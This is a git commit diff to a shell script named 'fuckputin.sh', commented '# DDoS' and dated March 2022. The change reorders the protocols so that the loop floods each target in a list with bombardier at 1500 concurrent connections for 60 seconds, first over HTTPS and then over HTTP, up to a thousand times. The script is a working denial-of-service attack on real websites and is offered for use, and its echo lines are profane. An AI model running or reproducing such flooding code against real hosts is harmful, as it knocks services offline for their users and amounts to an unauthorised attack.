c87b89150b16e70f02abe34b1a54fdc7362dbbff
Vlad Kolbaia <vlad.kolbaia@gmail.com>
2022-03-08 09:25:37 +0200

    Switch protocol order

--- fuckputin.sh
+++ fuckputin.sh
@@ -10,10 +10,10 @@ for n in {1..1000}; do
         
         # DDoS
         echo "Fucking - ${list[i]}"
-        bombardier -c 1500 -d 60s -l http://${list[i]} --http1
-        echo "Switching to https"
-        sleep 2
         bombardier -c 1500 -d 60s -l https://${list[i]} --http1
+        echo "Switching to http"
+        sleep 2
+        bombardier -c 1500 -d 60s -l http://${list[i]} --http1
         echo "Fucked - ${list[i]}"
         sleep 2
         
